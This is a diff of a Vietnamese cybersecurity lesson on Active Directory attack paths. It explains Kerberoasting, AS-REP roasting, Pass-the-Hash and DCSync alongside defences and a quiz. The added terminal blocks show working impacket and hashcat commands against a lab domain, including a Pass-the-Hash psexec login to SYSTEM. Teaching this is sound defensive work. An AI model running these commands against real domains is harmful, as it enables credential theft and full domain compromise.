@@ -2,15 +2,16 @@
 title: "Active Directory: điểm yếu thường gặp và phòng thủ"
 code: "3.5"
 level: 3
-summary: "Vì sao kẻ tấn công lan từ một tài khoản thường tới cả domain, và cách bên phòng thủ chặn lại."
-duration: "70 phút"
+summary: "Kerberoasting, AS-REP roasting, Pass-the-Hash, DCSync — các đường đi kinh điển và công cụ, cùng cách chặn."
+duration: "90 phút"
 objectives:
   - "Hiểu khái niệm đường đi tấn công (attack path) trong AD"
-  - "Nhận ra các lớp điểm yếu phổ biến ở mức khái niệm"
-  - "Thấy quan hệ quyền hạn tạo ra đường đi bất ngờ ra sao"
-  - "Nắm các biện pháp phòng thủ tương ứng"
+  - "Nhận ra Kerberoasting, AS-REP roasting, Pass-the-Hash, DCSync ở mức cơ chế"
+  - "Biết công cụ tương ứng (impacket, Rubeus, mimikatz)"
+  - "Nắm các biện pháp phòng thủ"
 ---
 import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
 import ConceptMap from '../../components/sim/ConceptMap.tsx';
 import Quiz from '../../components/sim/Quiz.tsx';
 
@@ -22,21 +23,16 @@ Trong một công ty, một nhân viên thường không có chìa khoá phòng 
 
 ### Đường đi tấn công
 
-Trong AD, giữa các đối tượng có vô số quan hệ quyền hạn: ai thuộc nhóm nào, ai quản lý được tài khoản nào, ai đăng nhập ở máy nào. Kẻ tấn công không cần một lỗ hổng duy nhất to lớn; họ nối nhiều quan hệ nhỏ thành một chuỗi từ tài khoản thường tới quyền quản trị domain. Chuỗi đó gọi là *attack path*.
+Giữa các đối tượng AD có vô số quan hệ quyền hạn. Kẻ tấn công không cần một lỗ hổng to; họ nối nhiều quan hệ nhỏ thành chuỗi từ tài khoản thường tới Domain Admin. Chuỗi đó là *attack path*, và BloodHound (bài 3.4) vẽ ra nó.
 
-Đây là lý do AD khó bảo vệ: mỗi quan hệ riêng lẻ trông hợp lý, nhưng ghép lại tạo ra đường đi không ai cố ý tạo ra.
+### Các kỹ thuật kinh điển (cơ chế)
 
-### Các lớp điểm yếu phổ biến (mức khái niệm)
+- **Kerberoasting:** bất kỳ người dùng domain nào cũng xin được vé dịch vụ (TGS) cho một tài khoản có SPN. Vé đó được mã hoá bằng mật khẩu của tài khoản dịch vụ, nên đem về **bẻ khoá ngoại tuyến** (bài 2.6). Tài khoản dịch vụ hay có mật khẩu yếu, ít đổi.
+- **AS-REP roasting:** tài khoản bị tắt "yêu cầu tiền xác thực Kerberos" sẽ trả về một phần mã hoá bằng mật khẩu của nó mà **không cần đăng nhập** — lại đem về bẻ khoá.
+- **Pass-the-Hash (PtH):** trên Windows, để xác thực đôi khi chỉ cần **hash NTLM** của mật khẩu, không cần mật khẩu gốc. Lấy được hash là đăng nhập được, khỏi bẻ khoá.
+- **DCSync:** một tài khoản có quyền sao chép của DC có thể "giả làm DC" yêu cầu đồng bộ và rút **hash mật khẩu của mọi người dùng**, kể cả Administrator. Thường là nước đi cuối.
 
-- **Tài khoản quyền cao dùng bừa:** quản trị viên đăng nhập vào máy thường ngày. Dấu vết phiên đăng nhập của họ để lại trên máy đó có thể bị lợi dụng nếu máy bị chiếm.
-- **Lạm dụng vé Kerberos:** nhớ lại các loại vé ở bài 3.4. Một số cấu hình cho phép xin hoặc dùng vé theo cách ngoài ý định, mở đường tới tài khoản khác.
-- **Mật khẩu yếu hoặc để lộ trong AD:** một số trường thông tin trong AD vô tình chứa mật khẩu; tài khoản dịch vụ hay đặt mật khẩu yếu và ít đổi.
-- **Quyền uỷ nhiệm cấu hình rộng tay:** cho phép một tài khoản hành động "thay mặt" tài khoản khác, nếu cấu hình lỏng sẽ bị lợi dụng.
-- **Quan hệ tin cậy giữa domain quá rộng:** mở đường từ domain ít quan trọng sang domain quan trọng.
-
-Mỗi mục trên là một chủ đề lớn; ở cấp này mục tiêu là nhận ra **loại** vấn đề và hiểu vì sao nó nguy hiểm.
-
-### Sơ đồ: một đường đi ví dụ
+### Một đường đi ví dụ
 
 <ConceptMap
   client:visible
@@ -44,10 +40,10 @@ Mỗi mục trên là một chủ đề lớn; ở cấp này mục tiêu là nh
   width={660}
   height={300}
   nodes={[
-    { id: 'emp', label: 'Tài khoản nhân viên', x: 110, y: 150, detail: 'Điểm khởi đầu: một tài khoản thường mà kẻ tấn công đã chiếm.' },
-    { id: 'grp', label: 'Nhóm trợ giúp IT', x: 300, y: 80, tone: 'warn', detail: 'Nhân viên tình cờ thuộc nhóm này. Nhóm có quyền đặt lại mật khẩu cho một số tài khoản khác.' },
-    { id: 'svc', label: 'Tài khoản dịch vụ', x: 300, y: 220, tone: 'warn', detail: 'Một tài khoản mà nhóm IT đặt lại mật khẩu được. Tài khoản này lại có quyền cao trên một máy chủ quan trọng.' },
-    { id: 'da', label: 'Quản trị domain', x: 540, y: 150, tone: 'accent', detail: 'Đích đến. Từ máy chủ quan trọng, dấu vết của một phiên quản trị domain có thể bị thu thập, hoàn tất đường đi.' },
+    { id: 'emp', label: 'Tài khoản nhân viên', x: 110, y: 150, detail: 'Điểm khởi đầu: một tài khoản domain thường đã chiếm (ví dụ qua Kerberoasting một svc yếu).' },
+    { id: 'grp', label: 'Nhóm trợ giúp IT', x: 300, y: 80, tone: 'warn', detail: 'Tài khoản tình cờ thuộc nhóm này, có quyền đặt lại mật khẩu cho một số tài khoản khác.' },
+    { id: 'svc', label: 'Tài khoản quyền cao', x: 300, y: 220, tone: 'warn', detail: 'Tài khoản mà nhóm IT đặt lại mật khẩu được, lại có quyền trên DC.' },
+    { id: 'da', label: 'Domain Admin / DCSync', x: 540, y: 150, tone: 'accent', detail: 'Đích đến. Với quyền phù hợp, DCSync rút hash của mọi người dùng, hoàn tất chiếm domain.' },
   ]}
   edges={[
     { from: 'emp', to: 'grp', label: 'thành viên' },
@@ -56,41 +52,65 @@ Mỗi mục trên là một chủ đề lớn; ở cấp này mục tiêu là nh
   ]}
 />
 
+## Thực hành: công cụ cho từng kỹ thuật
+
+Bộ **impacket** (Python) và **Rubeus**/**mimikatz** (Windows) là công cụ chủ lực.
+
+<Terminal title="Kerberoasting bằng impacket">
+kali@lab:~$ impacket-GetUserSPNs -request -dc-ip 10.10.14.50 megacorp.lab/jdoe:'Summer2024!'
+ServicePrincipalName  Name     ...
+MSSQL/sql01           svc_sql
+$krb5tgs$23$*svc_sql*...$hoRtE9k...   # đem hash này đi bẻ:
+
+kali@lab:~$ hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
+$krb5tgs$23$...:P@ssw0rd2019          # mật khẩu svc_sql
+</Terminal>
+
+<Terminal title="AS-REP roasting và Pass-the-Hash bằng impacket">
+kali@lab:~$ impacket-GetNPUsers megacorp.lab/ -usersfile users.txt -dc-ip 10.10.14.50
+$krb5asrep$23$svc_old@MEGACORP.LAB:...   # tài khoản tắt tiền xác thực
+
+kali@lab:~$ impacket-psexec -hashes :aad3b...31d6c megacorp.lab/administrator@10.10.14.60
+# Pass-the-Hash: đăng nhập chỉ bằng hash NTLM, không cần mật khẩu gốc
+C:\> whoami
+nt authority\system
+</Terminal>
+
 <Callout type="note">
-Bấm lần lượt từng ô theo chiều mũi tên. Không có bước nào là "lỗ hổng phần mềm" cả, tất cả đều là quyền hạn được cấu hình. Đó chính là bản chất của tấn công AD.
+Mẫu số chung: nhiều kỹ thuật kết thúc bằng một hash đem đi <strong>bẻ khoá ngoại tuyến</strong> (bài 2.6) hoặc dùng thẳng (Pass-the-Hash). Hãy thấy sợi dây nối các bài: liệt kê (3.4) → lấy vé/hash (3.5) → bẻ khoá (2.6) → đăng nhập → lặp lại ở quyền cao hơn.
 </Callout>
 
 ## Góc phòng thủ
 
 <Callout type="defense">
-Phòng thủ AD hiện đại tập trung vào thu hẹp các đường đi hơn là vá từng lỗi:
-<br />• Dùng tài khoản riêng cho việc quản trị, và chỉ đăng nhập chúng vào những máy được bảo vệ nghiêm (phân tầng quản trị).
-<br />• Giảm số thành viên các nhóm quyền cao xuống mức tối thiểu và rà soát định kỳ.
-<br />• Đặt mật khẩu mạnh, đổi tự động cho tài khoản dịch vụ.
-<br />• Rà soát quyền uỷ nhiệm và quan hệ tin cậy.
-<br />• Giám sát các hành vi bất thường quanh vé Kerberos và việc đặt lại mật khẩu.
-<br />Có công cụ vẽ bản đồ quan hệ trong AD; bên phòng thủ dùng chính chúng để tìm và cắt các đường đi trước kẻ tấn công.
+Phòng thủ AD hiện đại tập trung thu hẹp đường đi hơn là vá từng lỗi:
+<br />• Mật khẩu tài khoản dịch vụ dài và đổi tự động (gMSA) để Kerberoasting vô dụng.
+<br />• Bật tiền xác thực Kerberos cho mọi tài khoản (chặn AS-REP roasting).
+<br />• Dùng tài khoản quản trị riêng, chỉ đăng nhập máy được bảo vệ (phân tầng), hạn chế Pass-the-Hash.
+<br />• Giới hạn tối thiểu quyền sao chép của DC (chặn DCSync) và giám sát các yêu cầu đồng bộ bất thường.
+<br />• Chạy BloodHound định kỳ để tự tìm và cắt đường đi.
 </Callout>
 
 ## Lỗi người mới hay gặp
 
-- Tìm một "lỗ hổng" duy nhất, trong khi AD thường bị hạ bằng chuỗi nhiều quan hệ hợp lệ.
-- Bỏ qua tài khoản dịch vụ, vốn hay có mật khẩu yếu và quyền cao.
-- Không vẽ lại đường đi khi liệt kê, nên không thấy được bức tranh tổng thể.
+- Tìm một "lỗ hổng" duy nhất, trong khi AD thường bị hạ bằng chuỗi quan hệ hợp lệ.
+- Bỏ qua tài khoản dịch vụ (SPN), nơi mở ra Kerberoasting.
+- Không chạy BloodHound, nên không thấy bức tranh đường đi tổng thể.
 
 ## Kiểm tra nhanh
 
 <Quiz
   client:visible
   questions={[
-    { q: 'Attack path trong AD là gì?', options: ['Một lỗ hổng phần mềm lớn', 'Chuỗi nhiều quan hệ quyền hạn nối từ quyền thấp tới quyền cao', 'Một loại virus'], answer: 1, explain: 'Nhiều quan hệ nhỏ, mỗi cái hợp lý, ghép lại thành đường đi tới quản trị domain.' },
-    { q: 'Vì sao tài khoản dịch vụ thường là mắt xích yếu?', options: ['Vì chúng không có quyền gì', 'Vì hay có mật khẩu yếu, ít đổi, nhưng lại quyền cao', 'Vì chúng luôn bị khoá'], answer: 1, explain: 'Tài khoản dịch vụ thường cấu hình một lần rồi để đó với mật khẩu yếu và quyền rộng.' },
-    { q: 'Hướng phòng thủ AD hiện đại nhấn mạnh điều gì?', options: ['Chỉ cần vá phần mềm', 'Thu hẹp và cắt các đường đi tấn công', 'Đổi tên domain'], answer: 1, explain: 'Vì vấn đề là quan hệ quyền hạn, phòng thủ tập trung vào giảm và cắt các đường đi.' },
+    { q: 'Kerberoasting lợi dụng điều gì?', options: ['Lỗi phần mềm DC', 'Bất kỳ người dùng domain nào cũng xin được vé dịch vụ, mã hoá bằng mật khẩu tài khoản dịch vụ, rồi đem bẻ khoá', 'Mật khẩu để lộ trong file'], answer: 1, explain: 'Vé TGS cho tài khoản có SPN được mã hoá bằng mật khẩu của tài khoản đó, nên đem bẻ khoá ngoại tuyến.' },
+    { q: 'Pass-the-Hash nghĩa là gì?', options: ['Đoán mật khẩu từ hash', 'Xác thực chỉ bằng hash NTLM, không cần mật khẩu gốc', 'Gửi hash cho DC để đổi mật khẩu'], answer: 1, explain: 'Trên Windows, đôi khi hash NTLM là đủ để xác thực, khỏi cần bẻ về mật khẩu gốc.' },
+    { q: 'DCSync cho kẻ tấn công thứ gì?', options: ['Một web shell', 'Hash mật khẩu của mọi người dùng, bằng cách giả làm DC yêu cầu đồng bộ', 'Quyền đọc một file'], answer: 1, explain: 'Với quyền sao chép của DC, kẻ tấn công rút được hash toàn domain, kể cả Administrator.' },
+    { q: 'Hướng phòng thủ AD hiện đại nhấn mạnh điều gì?', options: ['Chỉ vá phần mềm', 'Thu hẹp và cắt các đường đi tấn công', 'Đổi tên domain'], answer: 1, explain: 'Vì vấn đề là quan hệ quyền hạn, phòng thủ tập trung giảm và cắt đường đi.' },
   ]}
 />
 
 ## Ghi nhớ
 
-- Tấn công AD thường là nối nhiều quan hệ quyền hạn hợp lệ thành một đường đi.
-- Các lớp điểm yếu: quản trị dùng bừa, lạm dụng vé, mật khẩu lộ, uỷ nhiệm và tin cậy rộng tay.
-- Phòng thủ: phân tầng quản trị, giảm nhóm quyền cao, bảo vệ tài khoản dịch vụ, giám sát và cắt đường đi.
+- Tấn công AD = nối nhiều quan hệ hợp lệ thành đường đi tới Domain Admin.
+- Kỹ thuật kinh điển: Kerberoasting, AS-REP roasting, Pass-the-Hash, DCSync (impacket, Rubeus, mimikatz).
+- Nhiều kỹ thuật kết thúc bằng một hash đem bẻ khoá hoặc dùng thẳng; phòng thủ là cắt đường đi.
